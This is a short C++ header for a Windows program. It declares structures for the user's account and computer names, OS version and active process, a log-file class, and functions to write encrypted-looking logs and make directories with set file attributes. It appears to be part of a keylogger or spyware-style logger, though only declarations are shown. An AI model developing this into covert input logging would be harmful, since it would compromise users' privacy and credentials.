#ifndef BLXR__STREAM_H_
#define BLXR__STREAM_H_

#include <filesystem>
#include <fstream>
#include <sstream>
#include <rpc.h>
#include <lmcons.h>

#include "helper.h"
#include "encrypt.h"

struct ClientInfo {
  OSVERSIONINFO osVersionInfo{};
  char accountName[UNLEN + 1]{};
  char computerName[UNLEN + 1]{};
  uint32_t activeProcess = 0x0;

} static clientInfo, *pClientInfo;

struct BDirectory {
  std::string name;
  std::string path;
} static mainDir;

namespace Stream {
class LogFile {
 public:
  std::ofstream Ofstream;
  std::string Name;
  std::string Path;
  std::string PathFull;

  LogFile(const std::string &path, const std::string &name) : Ofstream(path + name, std::fstream::in),
															  Path(path),
															  Name(name),
															  PathFull(path + name) {}
} static *logFile;

std::string GetPath(const std::string &dir = "");
bool MakeDir(const std::string &path, const std::string &name, DWORD fileAttribute = FILE_ATTRIBUTE_NORMAL);
bool MakeFile(const std::string &fileName, const std::string &path);
bool WriteLog(const std::string &input, int active, bool blockProcessInfo = false);
void GetAccountInfo(ClientInfo *data);
}

#endif //BLXR__STREAM_H_
